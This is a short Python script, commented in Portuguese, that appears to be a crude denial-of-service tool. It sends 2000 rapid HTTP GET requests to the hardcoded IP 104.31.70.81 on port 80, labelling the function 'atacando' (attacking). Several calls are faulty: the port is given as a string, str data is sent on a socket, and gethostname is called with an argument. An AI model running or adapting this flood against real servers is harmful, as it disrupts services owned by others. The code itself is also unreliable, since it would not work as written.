import socket
import os
import threading
import time
import sys

print("Iniciando Sistema...")
time.sleep(2)


def atacando(host, port):
    try:

        tcp=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dest = (host,port)
        tcp.connect(dest)
        tcp.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")
        tcp.send("Host: " + sys.argv[1]  + "\r\n\r\n")
        tcp.close()
    except:
        print("O ataque não funcionou")

def pegando_host(host):
    try:
        socket.gethostname(host)
    except:
        print("Não consegui obter o nome do host")

for x in range (1,2000):
    time.sleep(0.009)
    atacando('104.31.70.81','80')
    pegando_host('www.google.com')


